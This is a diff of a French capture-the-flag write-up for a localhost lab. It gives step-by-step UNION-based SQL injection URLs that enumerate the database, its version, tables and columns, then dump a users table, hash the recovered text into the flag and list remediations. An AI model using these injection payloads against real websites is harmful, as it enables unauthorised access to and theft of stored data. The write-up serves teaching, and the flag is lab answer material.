@@ -1,78 +1,87 @@
 explication :
 
-Voici l url de base quand on recherche une image :
+Voici l’URL de base quand on recherche une image :
 
 http://localhost:8080/?page=searchimg&id=5&Submit=Submit#
 
------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-le premier test pour verifier si on peut faire une injection sql est d ajouter du code
-sql pour verifier si on peut injecter du code, on ajoute alors cette conditions 
-"OR 1=1" qui est une condition qui est toujours vrais et qui vas nous permettre d afficher 
-tout les images stocker.
-voici a quoi ressemble la requette sql : 
+Le premier test pour vérifier si on peut faire une injection SQL est d’ajouter du code
+SQL pour vérifier si on peut injecter du code. On ajoute alors cette condition
+"OR 1=1", qui est une condition qui est toujours vraie et qui va nous permettre d’afficher
+toutes les images stockées.
+Voici à quoi ressemble la requête SQL :
 
 SELECT id, first_name, last_name FROM users WHERE id = '5 OR 1=1';
 
-URL: http://localhost:8080/?page=searchimg&id=5%20or%201=1&Submit=Submit#
+URL : http://localhost:8080/?page=searchimg&id=5%20or%201=1&Submit=Submit#
 
------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-Maintenant qu on a vu que le site est sensible aux injections SQL ils nous faut trouver
-la "forme" du tableau et le nombre de colone qu il contient. Il faut voir ca comme un tableau 
-excel. On vas faire des teste pour trouver le nombre de colone, pour ca nous allons utiliser
-UNION SELECT 'param', UNION SELECT nous permet en temps normal de fusioner deux tableaux. la
-seul condition pour que ca fonctionne c est que le tableau fasse la meme taille, on vas donc 
-remplacer 'param' par le nombre de colone on commence donc a 1 puis 1,2 et ainsi de suite.
-Dans notres cas on s apercoit que notre DB a deux colone.
+Maintenant qu’on a vu que le site est sensible aux injections SQL, il nous faut trouver
+la "forme" du tableau et le nombre de colonnes qu’il contient. Il faut voir ça comme un tableau
+Excel. On va faire des tests pour trouver le nombre de colonnes ; pour ça, nous allons utiliser
+UNION SELECT 'param'. UNION SELECT nous permet en temps normal de fusionner deux tableaux. La
+seule condition pour que ça fonctionne, c’est que le tableau fasse la même taille. On va donc
+remplacer 'param' par le nombre de colonnes : on commence à 1, puis 1,2, et ainsi de suite.
+Dans notre cas, on s’aperçoit que notre DB a deux colonnes.
 
-URL: http://localhost:8080/?page=searchimg&id=5%20UNION%20SELECT%201,2%20--%20&Submit=Submit#
+URL : http://localhost:8080/?page=searchimg&id=5%20UNION%20SELECT%201,2%20--%20&Submit=Submit#
 
------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-Maintenant qu on a le nombre de colone on vas essayer de touver le nom de la DB. Pour ca on vas
-encore utiliser notre UNION SELECT, on vas donc remplacer la deuxieme colone par le nom de la DB
-en utilisant la fonction databass().
+Maintenant qu’on a le nombre de colonnes, on va essayer de trouver le nom de la DB. Pour ça, on va
+encore utiliser notre UNION SELECT. On va donc remplacer la deuxième colonne par le nom de la DB
+en utilisant la fonction database().
 
 URL : http://localhost:8080/?page=member&id=5%20UNION%20SELECT%201,database()&Submit=Submit#
 
-et voici le nom de la db : Member_Sql_Injection de la meme maniere on vas recuperer la version
-de la db. Qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
+Et voici le nom de la DB : Member_Sql_Injection. De la même manière, on va récupérer la version
+de la DB, qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
 
-URL: http://localhost:8080/?page=member&id=5%20UNION%20SELECT%201,version()&Submit=Submit#
+URL : http://localhost:8080/?page=member&id=5%20UNION%20SELECT%201,version()&Submit=Submit#
 
------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-Sachant que la version est superieur a 5.0 on peut utiliser des fonction comme schema qui vas
-nous permettre de trouver le nom de chaque champs du tableau. 
+Sachant que la version est supérieure à 5.0, on peut utiliser des fonctions comme schema, qui vont
+nous permettre de trouver le nom de chaque champ du tableau.
 
-Avec cette URL on trouve le nom de la table qui est 'users' 
-URL: http://localhost:8080/?page=member&id=5%20UNION%20ALL%20SELECT%201,%20group_concat(table_name)%20FROM%20Information_schema.tables%20WHERE%20table_schema=database()&Submit=Submit#
+Avec cette URL, on trouve le nom de la table, qui est 'users' :
+URL : http://localhost:8080/?page=member&id=5%20UNION%20ALL%20SELECT%201,%20group_concat(table_name)%20FROM%20Information_schema.tables%20WHERE%20table_schema=database()&Submit=Submit#
 
-De la meme maniere on vas essayer de trouver le nom des colones sauf qu on encode en hexa 'users'
-car certaines chaines de caracteres peuvent casser les requettes c est pour ca qu on utilise :0x7573657273
-a la place de 'users'
-URL: http://localhost:8080/?page=member&id=5%20union%20all%20select%201,group_concat(column_name)%20from%20Information_schema.columns%20where%20table_name=0x7573657273&Submit=Submit#  
+De la même manière, on va essayer de trouver le nom des colonnes, sauf qu’on encode en hexadécimal 'users'
+car certaines chaînes de caractères peuvent casser les requêtes. C’est pour ça qu’on utilise : 0x7573657273
+à la place de 'users'
+URL : http://localhost:8080/?page=member&id=5%20union%20all%20select%201,group_concat(column_name)%20from%20Information_schema.columns%20where%20table_name=0x7573657273&Submit=Submit#
 
-on trouve que le tableau users contient : user_id,first_name,last_name,town,country,planet,Commentaire,countersign
+On trouve que le tableau users contient : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
 
------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-Il nous reste plus qu a fouille dans les differents champs, en utilisant cette URL:
+Il ne nous reste plus qu’à fouiller dans les différents champs, en utilisant cette URL :
 
-URL: http://localhost:8080/?page=member&id=5%20union%20all%20select%201,group_concat(Commentaire,0x0a)%20from%20users&Submit=Submit#
+URL : http://localhost:8080/?page=member&id=5%20union%20all%20select%201,group_concat(Commentaire,0x0a)%20from%20users&Submit=Submit#
 
-on trouve ce message dans la section commentaire :
+On trouve ce message dans la section commentaire :
 
-ID: 5 union all select 1,group_concat(Commentaire,0x0a) from users 
+ID: 5 union all select 1,group_concat(Commentaire,0x0a) from users
 First name: 1
 Surname : Je pense, donc je suis
 ,Aamu on iltaa viisaampi.
 ,Dublin is a city of stories and secrets.
 ,Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 
-plus qu a suivre la consigne on obtient donc : 5ff9d0165b4f92b14994e5c685cdce28 que on vas mettre en minuscule
+Il ne reste plus qu’à suivre la consigne. On obtient donc : 5ff9d0165b4f92b14994e5c685cdce28, que l’on va mettre en minuscule.
 
-on a un code encrypter en MD5 on le decypte sur https://md5.gromweb.com/ et on trouve FortyTwo
-on le met en minuscule et on utilise sh256
-et voici le flag : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+On a un code encrypté en MD5. On le décrypte sur https://md5.gromweb.com/
+et on trouve FortyTwo.
+On le met en minuscule et on utilise sha256,
+et voici le flag :
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+solution:
+
+-utiliser des requêtes perparees, les valeurs sont envoyees separement de la requête
+-ne jammais concatener directement dans la requête
+-masquer les message d erreur sql
+-utiliser un firewall
